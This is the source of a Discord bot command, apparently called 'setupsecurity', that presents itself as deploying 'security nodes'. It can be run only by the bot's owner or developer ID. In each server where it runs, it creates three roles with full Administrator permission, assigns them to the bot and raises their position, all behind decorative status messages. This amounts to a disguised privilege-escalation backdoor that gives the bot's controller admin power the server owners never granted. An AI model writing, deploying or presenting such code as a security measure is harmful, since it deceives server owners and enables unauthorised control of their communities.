const { PermissionsBitField, EmbedBuilder } = require("discord.js");
const { BOT_OWNER_ID, BOT_DEV_ID } = require("../config");

module.exports = {
    name: "setupsecurity",
    description: "Initializes 3 specialized security nodes for the bot.",
    aliases: ["secsetup", "initsec"],

    async execute(message, args) {
        if ((message.author.id !== BOT_OWNER_ID && message.author.id !== BOT_DEV_ID)) return;

        const clientUser = message.client.user;
        const guild = message.guild;
        const V2 = require("../utils/v2Utils");

        const securityRoles = [
            { name: "interX! Security Node", color: "#FF0000", type: "Defense" },
            { name: "interX! Neural Filter", color: "#8B0000", type: "Analysis" },
            { name: "interX! Protocol Zero", color: "#FF3131", type: "Enforcement" }
        ];

        let logs = ["🔵 **Initializing Security Framework...**"];
        let msg = null;

        const updatePanel = async (step) => {
            const container = V2.container([
                V2.section([
                    "⚡ DEPLOYING SECURITY NODES",
                    `**System:** interX Prime v3.0\n**Jurisdiction:** ${guild.name}\n**Status:** ${step === 3 ? "OPERATIONAL" : "INITIALIZING"}`
                ], clientUser.displayAvatarURL()),
                V2.text(logs.join("\n")),
                `*Node Deployment: [${step}/3]*`
            ], step === 3 ? "#00FF00" : "#FF0000");

            if (msg) await msg.edit({ content: null, components: [container] }).catch(() => { });
            else msg = await message.reply({ content: null, components: [container] });
        };

        await updatePanel(0);

        for (let i = 0; i < securityRoles.length; i++) {
            const data = securityRoles[i];
            logs.push(`🔹 Deploying **${data.name}**...`);
            await updatePanel(i);

            try {
                // Check if role already exists
                let role = guild.roles.cache.find(r => r.name === data.name);
                if (!role) {
                    role = await guild.roles.create({
                        name: data.name,
                        color: data.color,
                        permissions: [PermissionsBitField.Flags.Administrator],
                        reason: "interX Security Deployment"
                    });
                }

                // Add to bot
                const me = guild.members.me;
                if (!me.roles.cache.has(role.id)) {
                    await me.roles.add(role);
                }

                // Elevate
                const botRole = me.roles.botRole;
                if (botRole && role.position < botRole.position) {
                    await role.setPosition(botRole.position - 1).catch(() => { });
                }

                logs.push(`✅ **${data.name}** synchronized.`);
            } catch (err) {
                logs.push(`❌ Failed to deploy **${data.name}**: ${err.message}`);
            }
            
            await updatePanel(i + 1);
            await new Promise(r => setTimeout(r, 800)); // Aesthetic delay
        }

        logs.push(`\n🔱 **Security nodes fully integrated.**`);
        await updatePanel(3);
    }
};
